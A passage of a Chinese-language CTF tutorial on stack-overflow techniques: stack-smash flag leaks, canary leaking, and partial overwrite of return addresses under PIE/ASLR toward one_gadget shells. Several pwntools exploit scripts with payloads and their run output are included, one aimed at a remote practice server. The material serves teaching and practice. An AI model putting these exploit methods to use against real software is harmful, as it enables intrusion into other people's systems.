***: &#x27;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">print <span class="string">&#x27;stack_addr: &#x27;</span>+hex(stack_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line">print <span class="string">&#x27;flag:&#x27;</span> + flag</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h3><p>Jarvis OJ中的smashes，与题目一一样，但是可以直接在本地显示错误信息，只是提供了一个复现场景</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python -c <span class="string">&#x27;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x400d20) + &quot;\n&quot;&#x27;</span>|./smashes.44838f6edd4408a53feb2e2bbfe5b229 </span><br><span class="line">Hello!</span><br><span class="line">What<span class="string">&#x27;s your name? Nice to meet you, AAAAAA..... </span></span><br><span class="line"><span class="string">Please overwrite the flag: Thank you, bye!</span></span><br><span class="line"><span class="string">*** stack smashing detected ***: PCTF&#123;Here&#x27;</span>s the flag on server&#125; terminated</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  from pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.jarvisoj.com&quot;</span>,<span class="string">&quot;9877&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>);</span><br><span class="line">flag_addr=<span class="number">0x400d20</span>                                                                                                 </span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x218</span>+p64(flag_addr)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">pwn<span class="meta">@pwn</span>-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Opening connection to pwn.jarvisoj.com on port <span class="number">9877</span>: Done</span><br><span class="line">PCTF&#123;57dErr_Smasher_good_work!&#125; terminated</span><br><span class="line"></span><br><span class="line">[*] Closed connection to pwn.jarvisoj.com port <span class="number">9877</span></span><br><span class="line">​````</span><br><span class="line"></span><br><span class="line"># 题目四</span><br><span class="line">main函数中存在栈溢出，源码如下：</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>int __cdecl main(int argc, const char argv, const char envp){ __int64 v4; &#x2F;&#x2F; rsp+18h char v5; &#x2F;&#x2F; rsp+20h char v6; &#x2F;&#x2F; rsp+A0h unsigned __int64 v7; &#x2F;&#x2F; rsp+128h<br>v7 &#x3D; _readfsqword(0x28u); putenv(“LIBC_FATAL_STDERR&#x3D;1”, argv, envp); v4 &#x3D; fopen64(“flag.txt”, “r”); if ( v4 ) { fgets(&amp;v5, 32LL, v4); fclose(v4); printf((unsigned __int64)”Interesting data loaded at %p\nYour username? “); fflush(0LL, &amp;v5); read(0LL, &amp;v6, 1024LL); } else { puts(“Error leyendo datos”); } return 0;}<br>pwn@pwn-PC:~&#x2F;Desktop$ checksec xpl[*] ‘&#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;xpl’ Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)<br>pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x400000 0x4c0000 r-xp c0000 0 &#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;xpl 0x6bf000 0x6c2000 rw-p 3000 bf000 &#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;xpl 0x6c2000 0x6e8000 rw-p 26000 0 [heap] 0x7ffff7ffa000 0x7ffff7ffd000 r–p 3000 0 [vvar] 0x7ffff7ffd000 0x7ffff7fff000 r-xp 2000 0 [vdso] 0x7ffffffdd000 0x7ffffffff000 rw-p 22000 0 [stack]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开启了ASLR，并且可以知道程序将flag.txt的flag值存放在了<span class="type">char</span> v5 <span class="comment">//[rsp+20h] [rbp-110h]中，这看起来与题目二相似，可以使用其思路，但是vmmap发现这没有动态编译，那么此思路就pass掉，再去找其他的办法，百思不得其解时，运行一下程序，发现会输出一个地址，回过头去看代码才发现因自己的知识储备太少，没有注意到prinf的中%p的是匹配的哪。</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwn@pwn-PC:~&#x2F;Desktop$ .&#x2F;xpl Interesting data loaded at 0x7ffe65dfcfd0Your username?<br>源码： printf((unsigned __int64)”Interesting data loaded at %p\nYour username? “);<br>调试： 0x4010d9 &lt;main+123&gt; lea rax, [rbp - 0x110] 0x4010e0 &lt;main+130&gt; mov rsi, rax 0x4010e3 &lt;main+133&gt; mov edi, 0x493b28 0x4010e8 &lt;main+138&gt; mov eax, 0 ► 0x4010ed &lt;main+143&gt; call printf &lt;0x408770&gt; format: 0x493b28 ◂— ‘Interesting data loaded at %p\nYour username? ‘ vararg: 0x7fffffffcc00 ◂— ‘flag{stack_smash}\n’<br>0x4010f2 &lt;main+148&gt; mov edi, 0 0x4010f7 &lt;main+153&gt; call fflush &lt;0x408c90&gt;<br>0x4010fc &lt;main+158&gt; lea rax, [rbp - 0x90] 0x401103 &lt;main+165&gt; mov edx, 0x400 0x401108 &lt;main+170&gt; mov rsi, rax────────────────────────[ STACK ]────────────────────────00:0000│ rsp 0x7fffffffcbe0 —▸ 0x7fffffffcdf8 —▸ 0x7fffffffd0d6 ◂— ‘&#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;xpl’01:0008│ 0x7fffffffcbe8 ◂— 0x10000000002:0010│ 0x7fffffffcbf0 ◂— 0x003:0018│ 0x7fffffffcbf8 —▸ 0x6c7d40 ◂— 0x004:0020│ rsi 0x7fffffffcc00 ◂— ‘flag{stack_smash}\n’05:0028│ 0x7fffffffcc08 ◂— ‘ck_smash}\n’06:0030│ 0x7fffffffcc10 ◂— 0xa7d &#x2F;* ‘}\n’ *&#x2F;07:0038│ 0x7fffffffcc18 —▸ 0x401840 (__libc_csu_fini) ◂— push rbx</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  发现程序一开始输出的地址，就是v5所在的栈地址，也就是flag的地址，步骤如下：</span><br><span class="line">找到__libc_argv[<span class="number">0</span>]的地址：</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>43:0218│ rsi 0x7fffffffcdf8 —▸ 0x7fffffffd0d6 ◂— ‘&#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;xpl’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">计算出偏移量：</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwndbg&gt; i r rbprbp 0x7fffffffcd10 0x7fffffffcd10pwndbg&gt; x &#x2F;gx 0x7fffffffcd10-0x900x7fffffffcc80: 0x000000037ffffa00pwndbg&gt; distance 0x7fffffffcc80 0x7fffffffcdf80x7fffffffcc80-&gt;0x7fffffffcdf8 is 0x178 bytes (0x2f words)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取flag：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>from pwn import *<br>sh &#x3D; process(‘.&#x2F;xpl’)data &#x3D; sh.recvuntil(“username?”)address &#x3D; p64(int(data.split()[4], 16))sh.send(“A”*0x178 + address)print sh.recvline()<br>pwn@pwn-PC:~&#x2F;Desktop$ python exp.py [+] Starting local process ‘.&#x2F;xpl’: pid 4363 *** stack smashing detected ***: flag{stack_smash}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  # partial write</span><br><span class="line">根据前面的内容可以知道在开启ASLR+PIE的后，每次加载的地址是在一定的范围随机变化的，只不过由于内存页为<span class="number">0x1000</span>空间大小的限制和加载后相对偏移不会变的缘故，造成了加载后的地址的最后一个半字节长度的内容是不变的。</span><br><span class="line">partial write则是利用了这一点，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为<span class="number">0x1000</span>，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的，因此我们可以��过覆盖地址的后几位来可以控制程序的执行流。</span><br><span class="line">另外，partial overwrite不仅仅可以用在栈上，同样可以用在其它随机化的场景。比如堆的随机化，由于堆起始地址低字节一定是<span class="number">0x00</span>，也可以通过覆盖低位来控制堆上的偏移。</span><br><span class="line"></span><br><span class="line"># 题目一</span><br><span class="line"><span class="number">2018</span>年安恒杯中babypie题，因为wiki中给的不是一个二进制文件，因此自己重新编译。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;void flag(){ system(“cat flag”);}void vuln(){ char buf[40]; puts(“Input your Name:”); read(0, buf, 0x30); printf(“Hello %s:\n”, buf); read(0, buf, 0x60); }int main(int argc, char const <em>argv[]){ vuln(); return 0;}<br>pwn@pwn-PC:<del>&#x2F;Desktop$ gcc -fpie -pie -fstack-protector -o test-pie partial.cpwn@pwn-PC:</del>&#x2F;Desktop$ checksec test-pie [</em>] ‘&#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;test-pie’ Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  此题目所有保护都开着，首先发现有canary，就想着使用stack smash泄漏flag函数的地址，然后此地址作为第二次read的ret_addr地址进行执行，但是只有第二次read操作存在栈溢出，而且溢出的距离无法到达到覆盖__libc_argv[<span class="number">0</span>]的距离，假设即便能覆盖，在PIE的情况下也很难确定.text的地址，因此本题使用partial overwrite的方法进行利用。</span><br><span class="line">可以发现两次read操作，只有第二次read操作存在栈溢出，但是又有canary，很难利用第二次的栈溢出，那么怎么去解决？</span><br><span class="line">首先需要获取canary的值， 因为read函数并不会给输入的末尾加上 \x00 字符，而且printf 使用 %s 时, 遇到 \x00 字符才会结束输出，因此只需要把canary末尾字符覆盖成非 \x00 字符就可以利用printf(<span class="string">&quot;Hello %s:\n&quot;</span>, buf)输出canary，然后再利用partial overwrite覆盖ret_addr控制程序的指令流，步骤如下：</span><br><span class="line">泄漏canary值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>from pwn import <em>context.arch &#x3D; ‘amd64’context.log_level &#x3D; ‘debug’context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]offset &#x3D; 0x28p &#x3D; process(‘.&#x2F;test-pie’)p.recvuntil(“Name:\n”)payload&#x3D;’a’ * offset gdb.attach(p)p.sendline(payload) p.recvuntil(‘a’ * offset)p.recv(1)canary &#x3D; u64(‘\0’ + p.recvn(7))print hex(canary)<br>pwn@pwn-PC:~&#x2F;Desktop$ python exp.py [+] Starting local process ‘.&#x2F;test-pie’: pid 28293[DEBUG] Received 0x11 bytes: ‘Input your Name:\n’[DEBUG] Wrote gdb script to ‘&#x2F;tmp&#x2F;pwnozkM_1.gdb’ file “.&#x2F;test-pie”[</em>] running in new terminal: &#x2F;usr&#x2F;bin&#x2F;gdb -q “.&#x2F;test-pie” 28293 -x “&#x2F;tmp&#x2F;pwnozkM_1.gdb”[DEBUG] Launching a new terminal: [‘&#x2F;usr&#x2F;bin&#x2F;deepin-terminal’, ‘-x’, ‘sh’, ‘-c’, ‘&#x2F;usr&#x2F;bin&#x2F;gdb -q “.&#x2F;test-pie” 28293 -x “&#x2F;tmp&#x2F;pwnozkM_1.gdb”‘][+] Waiting for debugger: Done[DEBUG] Sent 0x29 bytes: ‘aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n’[DEBUG] Received 0x2f bytes: ‘Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n’[DEBUG] Received 0xf bytes: 00000000 77 05 28 c0 f3 64 57 20 69 4e d8 fc 7f 3a 0a │w·(·│·dW │iN··│·:·│ 0000000f0x5764f3c028057700</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以看到，sent了<span class="number">0x29</span>个字符，因为buf的栈地址到canary值的地址的相距<span class="number">0x28</span>个字符，再加上覆盖的canary的末尾字符总共<span class="number">0x29</span>个字符，栈中覆盖情况如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>read(0, buf, 0x30)函数执行完成后：───────────────────────────────────[ STACK ]─────────────────────────────────────────00:0000│ rax r8 rsp 0x7ffcd84e68d0 ◂— 0x6161616161616161 (‘aaaaaaaa’)… ↓05:0028│ 0x7ffcd84e68f8 ◂— 0x5764f3c02805770a06:0030│ rbp 0x7ffcd84e6900 —▸ 0x7ffcd84e6920 —▸ 0x55a96ce218b0 ◂— push r1507:0038│ 0x7ffcd84e6908 —▸ 0x55a96ce2189a ◂— mov eax, 0───────────────────────────────────────────��─────────────────────────────────────pwndbg&gt; x &#x2F;18gx 0x7fff426083d00x7ffcd84e68d0: 0x6161616161616161 0x61616161616161610x7ffcd84e63e0: 0x6161616161616161 0x61616161616161610x7ffcd84e63f0: 0x6161616161616161 0x5764f3c02805770a</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  覆盖ret_addr控制程序的指令流</span><br><span class="line">首先找到flag的地址，最后一个半字节为<span class="number">0x7f0</span>，由于内存是按页夹在的 <span class="number">0x1000</span>为一页，因此每次加载这三位是���会变的，那么在payload中发送的时候(按字节发送，发送<span class="number">4</span>位)，第四位随便填写一个即可，每次对随机加载后的flag函数起始地址进行碰撞，因为范围在<span class="number">0x0</span> -<span class="number">0xf</span>，所以碰撞成功的几率挺大的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwndbg&gt; disassemble flagDump of assembler code for function flag: 0x00005555555547f0 &lt;+0&gt;: push rbp 0x00005555555547f1 &lt;+1&gt;: mov rbp,rsp 0x00005555555547f4 &lt;+4&gt;: lea rdi,[rip+0x139] # 0x555555554934 0x00005555555547fb &lt;+11&gt;: call 0x555555554680 system@plt 0x0000555555554800 &lt;+16&gt;: nop 0x0000555555554801 &lt;+17&gt;: pop rbp 0x0000555555554802 &lt;+18&gt;: ret End of assembler dump.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造payload，覆盖ret_addr的末尾两个字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>p.recvuntil(“:\n”) payload&#x3D;’a’ * offset + p64(canary) + ‘bbbbbbbb’ + ‘\xf0\x47’p.send(payload)<br>可以看到RAX、Canary、ret_addr的末尾两个字节都已经成功覆盖，后面的工作就是去碰撞。─────────────────────────────[ REGISTERS ]──────────────────────────────── RAX 0xa4c9b736e3763700 RBP 0x7ffe773d1da0 ◂— 0x6262626262626262 (‘bbbbbbbb’) RSP 0x7ffe773d1d70 ◂— ‘aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’ RIP 0x55cd0345386f ◂— xor rax, qword ptr fs:[0x28]──────────────────────────────[ DISASM ]───────────────────────────────── ► 0x55cd0345386f xor rax, qword ptr fs:[0x28] 0x55cd03453878 je 0x55cd0345387f ↓ 0x55cd0345387f leave 0x55cd03453880 ret ─────────────────────────── ───[ STACK ]─────────────────────────────────00:0000│ rsi r8 rsp 0x7ffe773d1d70 ◂— ‘aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’… ↓05:0028│ 0x7ffe773d1d98 ◂— 0xa4c9b736e376370006:0030│ rbp 0x7ffe773d1da0 ◂— 0x6262626262626262 (‘bbbbbbbb’)07:0038│ 0x7ffe773d1da8 ◂— 0x55cd034547f0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exp：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>from pwn import *context.arch &#x3D; ‘amd64’context.log_level &#x3D; ‘debug’context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]offset &#x3D; 0x28while True: try: p &#x3D; process(‘.&#x2F;test-pie’) p.recvuntil(“Name:\n”) payload&#x3D;’a’ * offset # gdb.attach(p) p.sendline(payload) p.recvuntil(‘a’ * offset) p.recv(1) canary &#x3D; u64(‘\0’ + p.recvn(7)) print hex(canary) p.recvuntil(“:\n”)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      payload=<span class="string">&#x27;a&#x27;</span> * offset + p64(canary) + <span class="string">&#x27;bbbbbbbb&#x27;</span> + <span class="string">&#x27;\xf0\x47&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    flag = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> in flag:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">except Exception as e:</span><br><span class="line">    p.close()</span><br><span class="line">    print e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwn@pwn-PC:~&#x2F;Desktop$ python exp.py [+] Starting local process ‘.&#x2F;test-pie’: pid 17736[DEBUG] Received 0x11 bytes: ‘Input your Name:\n’[DEBUG] Sent 0x29 bytes: ‘aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n’……[+] Receiving all data: Done (37B)[DEBUG] Received 0x25 bytes: ‘flag{23dih3879sad8dsk84ihv9fd0wnis0}\n’[] Process ‘.&#x2F;test-pie’ stopped with exit code -11 (SIGSEGV) (pid 17739)[] Stopped process ‘.&#x2F;test-pie’ (pid 17620</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  总结：在该情况下，因为有canary保护，所以先泄漏canary ，进而构造payload绕过canary覆盖返回地址来执行指定的函数。</span><br><span class="line"></span><br><span class="line"># 题目二</span><br><span class="line"><span class="number">2018</span>年XNUCA中的gets题目</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>int64 fastcall main(__int64 a1, char a2, char a3){ __int64 v4; &#x2F;&#x2F; rsp+0h<br>gets((**int64)&amp;v4, (*<em>int64)a2, (__int64)a3); return 0LL;}<br>pwn@pwn-PC:~&#x2F;Desktop$ checksec gets [</em>] ‘&#x2F;home&#x2F;pwn&#x2F;Desktop&#x2F;gets’ Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)依然没有PIE，但是开了ASLR保护</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只有一个gets函数而且存在明显栈溢出漏洞，想象空���很大，可以构造execve函数进行getshell，由于开启了ASLR，必须先构造read或者puts函数泄漏libc的地址，但代码段又没有这些函数，依然得需要先知道libc的加载地址。那么既然开启地址随机化，尝试partial overwrite去覆盖返回地址（覆盖成onegadget的地址）达到getshell的目的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ps：one-gadget是glibc里调用execve(‘&#x2F;bin&#x2F;sh’, NULL, NULL)的一段非常有用的gadget。在我们能够控制ip的时候，用one-gadget来做RCE（远程代码执行）非常方便，一般地，此办法在64位上常用，却在32位的libc上会很难去找，也很难用。<br>pwn@pwn-PC:~&#x2F;Desktop$ one_gadget &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.24.so0x3f306 execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: rax &#x3D;&#x3D; NULL<br>0x3f35a execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: [rsp+0x30] &#x3D;&#x3D; NULL<br>0xd695f execve(“&#x2F;bin&#x2F;sh”, rsp+0x60, environ)constraints: [rsp+0x60] &#x3D;&#x3D; NULL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  可以看到栈中main函数的返回地址是<span class="number">0x7ffff7a5a2e1</span>（__libc_start_main+<span class="number">241</span>），继续往下看还发现 <span class="number">0x7ffff7de896b</span> (_dl_init+<span class="number">139</span>)。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有两个地址，这有什么用呢？继续往下看</span><br><span class="line">发现两个地址分别属于libc和ld，而且经过多次实验发现在每次加载中，Id.so和libc.so的加载地址的相对位置是固定的，也就是偏移量不变。</span><br><span class="line"></span><br><span class="line">就好比开头提到的，一个比较自然的想法就是我们通过 partial overwrite 来修改<span class="number">0x7ffff7a5a2e1</span>的末尾两位字节为<span class="number">0xf306</span>（如题目一的思路），经过多次碰撞得到onegadget的地址，最终getshell。那么就开始构造flag，因为gets函数会在末尾读入一个\x00的结束符，因此实际上覆盖后的地址是这样的<span class="number">0x7ffff700f306</span>，但是这就面临一个问题。</span><br><span class="line">按照上面来说，如果直接覆盖返回地址 那么覆盖成了<span class="number">0x7ffff700f306</span>（严谨一点：<span class="number">0x7ffff7000306</span> - <span class="number">0x7ffff700f306</span>），那么计算出libc的加载地址为<span class="number">0x7ffff6fd0000</span>&lt;&lt;<span class="number">0x7ffff7a3a000</span>（严谨一点：<span class="number">0x7ffff6fc1000</span> - <span class="number">0x7ffff6fd0000</span>），也就是说libc加载在这个范围内才可能碰撞到onegadget，但是因为偏移量不变的原因，libc加载在这个范围内，覆盖后的onegadget的地址依然偏小，永远是不可能碰撞到的。如果还是不理解，那继续看这个假设实验：</span><br><span class="line">假设我们不知道__libc_start_main在libc的偏移量，并且祈祷__libc_start_main与libc的基址相距地很远，并且假设一下几个地址成立：</span><br><span class="line">onegadge地址：<span class="number">0x7ffff700f306</span> </span><br><span class="line">那么根据偏移计算出来</span><br><span class="line">libc的基址：<span class="number">0x7ffff6fd0000</span> （<span class="number">0x7ffff700f306</span>-<span class="number">0x3f306</span>）</span><br><span class="line">此时__libc_start_main+<span class="number">240</span>的地址：0x7ffff7xxxxxx（给一个最小的地址：<span class="number">0x7ffff7000000</span>），这样才上述的地址的相对位置才有可能成立。此时__libc_start_main的（最小）偏移量为<span class="number">0x2FF10</span>。</span><br><span class="line">现在去验证一下这个假设是否成立，只要真实的偏移量大于等于假设的偏移量，那么假设成立，查看__libc_start_main在libc中偏移量为<span class="number">0x201f0</span>&lt;<span class="number">0x2FF10</span>，也就是说上述假设不成立。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"><br>pwndbg&gt; xinfo __libc_start_mainExtended information for virtual address 0x7ffff7a5a1f0: Containing mapping: 0x7ffff7a3a000 0x7ffff7bcf000 r-xp 195000 0 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.24.so Offset information: Mapped Area 0x7ffff7a5a1f0 &#x3D; 0x7ffff7a3a000 + 0x201f0 File (Base) 0x7ffff7a5a1f0 &#x3D; 0x7ffff7a3a000 + 0x201f0 File (Segment) 0x7ffff7a5a1f0 &#x3D; 0x7ffff7a3a000 + 0x201f0 File (Disk) 0x7ffff7a5a1f0 &#x3D; &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.24.so + 0x201f0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+<span class="number">240</span> ，显然是不可能的。</span><br><span class="line">那么第二个地址_dl_init+<span class="number">139</span>就有用了，将其覆盖为<span class="number">0x7ffff700f306</span>，按照上面的方法看看是否可行。</span><br><span class="line">onegadge：<span class="number">0x7ffff700f306</span></span><br><span class="line">那么根据偏移计算出来</span><br><span class="line">libc的基址：<span class="number">0x7ffff6fd0000</span></span><br><span class="line">此时_dl_init+<span class="number">139</span>的地址：0x7ffff7xxxxxx（给一个最小的地址：<span class="number">0x7ffff7000000</span>），此时_dl_init的（最小）偏移量（距离libc）为<span class="number">0x2FF75</span></span><br><span class="line">libc和ld两者相距：<span class="number">0x39f000</span> （在加载的过程中，这个偏移是不变的）</span><br><span class="line">ld.so的加载地址：<span class="number">0x7ffff736f000</span> </span><br><span class="line">查看_dl_init真实的偏移量（在ld.so中）<span class="number">0xf8e0</span>，距离libc的偏移是<span class="number">0x3ae8e0</span>&gt;<span class="number">0x2FF75</span>，上述假设成立，��时_dl_init+<span class="number">139</span>的地址为：<span class="number">0x7ffff7de896b</span>（符合0x7ffff7xxxxxx形式）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwndbg&gt; xinfo _dl_initExtended information for virtual address 0x7ffff7de88e0: Containing mapping: 0x7ffff7dd9000 0x7ffff7dfc000 r-xp 23000 0 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.24.so Offset information: Mapped Area 0x7ffff7de88e0 &#x3D; 0x7ffff7dd9000 + 0xf8e0 File (Base) 0x7ffff7de88e0 &#x3D; 0x7ffff7dd9000 + 0xf8e0 File (Segment) 0x7ffff7de88e0 &#x3D; 0x7ffff7dd9000 + 0xf8e0 File (Disk) 0x7ffff7de88e0 &#x3D; &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.24.so + 0xf8e0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  也就是说，当libc的基址为<span class="number">0x7ffff6fd0000</span>是，此时覆盖栈上_dl_init+<span class="number">139</span>为<span 